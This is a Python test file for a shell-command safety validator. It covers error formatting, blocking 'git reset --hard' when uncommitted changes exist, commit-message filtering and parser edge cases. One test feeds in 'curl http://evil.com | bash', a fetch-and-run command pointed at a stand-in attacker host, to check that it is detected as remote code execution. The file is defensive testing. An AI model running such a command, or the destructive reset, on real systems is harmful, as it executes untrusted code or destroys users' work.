"""Tests to improve coverage on specific gaps identified by coverage analysis.

Targets:
- exceptions.py: lines 40, 88-91
- validator.py: lines 176-222 (git reset --hard protection)
- commit_filter.py: lines 145-154, 216-219, 227-228, 600-601, 606-609
- rules.py: lines 259-260
- parser.py: various branch coverage gaps
"""

import subprocess
from unittest.mock import MagicMock, patch

import pytest

from schlock.core.parser import BashCommandParser
from schlock.core.rules import RuleEngine
from schlock.core.validator import validate_command
from schlock.exceptions import ConfigurationError, ParseError
from schlock.integrations.commit_filter import CommitMessageFilter, load_filter_config


class TestParseErrorCoverage:
    """Cover ParseError edge cases."""

    def test_str_without_original_error(self):
        """ParseError.__str__ without original_error returns just message."""
        error = ParseError("Test message")
        assert str(error) == "Test message"
        assert error.original_error is None

    def test_str_with_original_error(self):
        """ParseError.__str__ with original_error includes both."""
        original = ValueError("original issue")
        error = ParseError("Test message", original_error=original)
        result = str(error)
        assert "Test message" in result
        assert "original: original issue" in result


class TestConfigurationErrorCoverage:
    """Cover ConfigurationError edge cases."""

    def test_format_with_file_path_only(self):
        """ConfigurationError with file_path but no line_number."""
        error = ConfigurationError("Invalid config", file_path="/path/to/file.yaml")
        result = str(error)
        assert "Invalid config" in result
        assert "in file: /path/to/file.yaml" in result
        assert "at line:" not in result

    def test_format_with_line_number_only(self):
        """ConfigurationError with line_number but no file_path."""
        error = ConfigurationError("Invalid config", line_number=42)
        result = str(error)
        assert "Invalid config" in result
        assert "at line: 42" in result
        assert "in file:" not in result

    def test_format_with_both(self):
        """ConfigurationError with both file_path and line_number."""
        error = ConfigurationError("Invalid config", file_path="/path/to/file.yaml", line_number=42)
        result = str(error)
        assert "Invalid config" in result
        assert "in file: /path/to/file.yaml" in result
        assert "at line: 42" in result

    def test_format_with_neither(self):
        """ConfigurationError with neither file_path nor line_number."""
        error = ConfigurationError("Invalid config")
        result = str(error)
        assert result == "Invalid config"


class TestGitResetHardProtection:
    """Cover git reset --hard protection in validator.py lines 176-222."""

    def test_git_reset_hard_with_uncommitted_changes(self, safety_rules_path):
        """Git reset --hard blocked when uncommitted changes detected."""
        # Mock git status to return uncommitted changes
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "M  modified_file.py\n"

        with patch("subprocess.run", return_value=mock_result):
            result = validate_command("git reset --hard HEAD", config_path=safety_rules_path)

        assert not result.allowed
        assert "uncommitted" in result.message.lower() or "BLOCKED" in result.message

    def test_git_reset_hard_timeout(self, safety_rules_path):
        """Git reset --hard blocked on git status timeout."""
        with patch("subprocess.run", side_effect=subprocess.TimeoutExpired("git", 5)):
            result = validate_command("git reset --hard HEAD", config_path=safety_rules_path)

        assert not result.allowed
        assert "timeout" in result.message.lower() or "BLOCKED" in result.message

    def test_git_reset_hard_git_not_found(self, safety_rules_path):
        """Git reset --hard continues to normal validation when git not found."""
        with patch("subprocess.run", side_effect=FileNotFoundError("git not found")):
            # Should fall through to normal validation (not crash)
            result = validate_command("git reset --hard HEAD", config_path=safety_rules_path)

        # Result depends on rules, but should not raise exception
        assert result is not None

    def test_git_reset_hard_generic_exception(self, safety_rules_path):
        """Git reset --hard continues to normal validation on generic error."""
        with patch("subprocess.run", side_effect=OSError("permission denied")):
            result = validate_command("git reset --hard HEAD", config_path=safety_rules_path)

        # Should fall through to normal validation
        assert result is not None

    def test_git_reset_hard_clean_repo(self, safety_rules_path):
        """Git reset --hard allowed when repo is clean."""
        # Mock git status to return clean (no output)
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = ""

        with patch("subprocess.run", return_value=mock_result):
            result = validate_command("git reset --hard HEAD", config_path=safety_rules_path)

        # Should proceed to normal rule validation (may still be blocked by rules)
        assert result is not None


class TestCommitFilterCoverage:
    """Cover commit_filter.py edge cases."""

    def test_custom_patterns_invalid_pattern(self):
        """Invalid custom pattern is skipped gracefully."""
        config = {
            "enabled": True,
            "rules": {},
            "custom_patterns": [{"pattern": "[invalid(regex", "description": "Bad pattern"}],
        }

        # Should not raise - invalid patterns are skipped
        filter_instance = CommitMessageFilter(config)
        assert filter_instance is not None

    def test_custom_patterns_missing_pattern_key(self):
        """Custom pattern missing 'pattern' key is skipped."""
        config = {
            "enabled": True,
            "rules": {},
            "custom_patterns": [
                {"description": "Missing pattern key"}  # No 'pattern' key
            ],
        }

        # Should not raise - invalid patterns are skipped
        filter_instance = CommitMessageFilter(config)
        assert filter_instance is not None

    def test_extract_commit_message_bashlex_attribute_error(self):
        """AttributeError in bashlex extraction falls back to regex."""
        config = {"enabled": True, "rules": {}}
        filter_instance = CommitMessageFilter(config)

        # Force AttributeError in bashlex extraction to test fallback
        with patch.object(filter_instance, "_extract_via_bashlex", side_effect=AttributeError("forced error")):
            message = filter_instance.extract_commit_message('git commit -m "test message"')
            # Should extract via regex fallback
            assert message == "test message"

    def test_extract_commit_message_unexpected_error(self):
        """Unexpected error in bashlex extraction falls back to regex."""
        config = {"enabled": True, "rules": {}}
        filter_instance = CommitMessageFilter(config)

        with patch.object(filter_instance, "_extract_via_bashlex", side_effect=RuntimeError("unexpected")):
            # Should fall back to regex
            message = filter_instance.extract_commit_message('git commit -m "test"')
            # Regex fallback should work
            assert message is None or isinstance(message, str)

    def test_extract_commit_message_regex_failure(self):
        """Both bashlex and regex fail returns None."""
        config = {"enabled": True, "rules": {}}
        filter_instance = CommitMessageFilter(config)

        with patch.object(filter_instance, "_extract_via_bashlex", return_value=None):  # noqa: SIM117
            with patch.object(filter_instance, "_extract_via_regex", side_effect=Exception("regex failed")):
                message = filter_instance.extract_commit_message('git commit -m "test"')
                assert message is None

    def test_load_filter_config_file_not_found(self, tmp_path):
        """load_filter_config returns empty config when file missing."""
        # Pass a non-existent config path
        config = load_filter_config(str(tmp_path / "nonexistent.yaml"))
        # Should return empty dict or handle gracefully
        assert isinstance(config, dict)

    def test_load_filter_config_invalid_yaml(self, tmp_path):
        """load_filter_config handles invalid YAML gracefully."""
        # Create an invalid YAML file
        rules_file = tmp_path / "invalid_rules.yaml"
        rules_file.write_text("invalid: yaml: content: [")

        # Should handle gracefully (return empty or raise appropriately)
        try:
            config = load_filter_config(str(rules_file))
            assert isinstance(config, dict)
        except (ValueError, OSError):
            # If it raises for invalid YAML or file issues, that's acceptable
            pass


class TestRulesEngineCoverage:
    """Cover rules.py edge cases."""

    def test_load_rules_generic_exception(self, tmp_path):
        """Generic exception when loading rules raises ConfigurationError."""
        rules_file = tmp_path / "rules.yaml"
        rules_file.touch()

        # Mock open to raise a generic exception
        with patch("builtins.open", side_effect=PermissionError("access denied")):
            with pytest.raises(ConfigurationError) as exc_info:
                RuleEngine(rules_file)

            assert "Failed to read rules file" in str(exc_info.value)


class TestParserBranchCoverage:
    """Cover parser.py branch coverage gaps."""

    def test_extract_commands_empty_ast(self):
        """extract_commands with empty AST returns empty list."""
        parser = BashCommandParser()
        commands = parser.extract_commands([])
        assert commands == []

    def test_extract_commands_none_ast(self):
        """extract_commands with None AST returns empty list."""
        parser = BashCommandParser()
        commands = parser.extract_commands(None)
        assert commands == []

    def test_extract_command_segments_empty_ast(self):
        """extract_command_segments with empty AST returns empty list."""
        parser = BashCommandParser()
        segments = parser.extract_command_segments("echo test", [])
        assert segments == []

    def test_reconstruct_command_empty_ast(self):
        """reconstruct_command with empty AST returns empty string."""
        parser = BashCommandParser()
        result = parser.reconstruct_command([])
        assert result == ""

    def test_reconstruct_command_none_ast(self):
        """reconstruct_command with None AST returns empty string."""
        parser = BashCommandParser()
        result = parser.reconstruct_command(None)
        assert result == ""

    def test_has_dangerous_constructs_empty_ast(self):
        """has_dangerous_constructs with empty AST returns empty list."""
        parser = BashCommandParser()
        dangers = parser.has_dangerous_constructs([])
        assert dangers == []

    def test_has_dangerous_constructs_none_ast(self):
        """has_dangerous_constructs with None AST returns empty list."""
        parser = BashCommandParser()
        dangers = parser.has_dangerous_constructs(None)
        assert dangers == []

    def test_dangerous_pipeline_detection(self):
        """Parser detects dangerous curl | bash patterns."""
        parser = BashCommandParser()
        # Parse a dangerous download-to-shell pattern
        ast = parser.parse("curl http://evil.com | bash")
        dangers = parser.has_dangerous_constructs(ast)
        assert isinstance(dangers, list)
        # Should detect remote code execution pattern
        assert any("remote code execution" in d.lower() or "curl" in d.lower() for d in dangers)

    def test_compound_command_traversal(self):
        """Parser handles compound commands with nested structures."""
        parser = BashCommandParser()
        # Test compound command with subshell
        ast = parser.parse("(echo test && ls)")
        segments = parser.extract_command_segments("(echo test && ls)", ast)
        assert isinstance(segments, list)

    def test_pipeline_with_assignments(self):
        """Parser handles pipeline with variable assignments."""
        parser = BashCommandParser()
        # Command with assignment prefix
        ast = parser.parse("VAR=value echo test")
        commands = parser.extract_commands(ast)
        assert isinstance(commands, list)
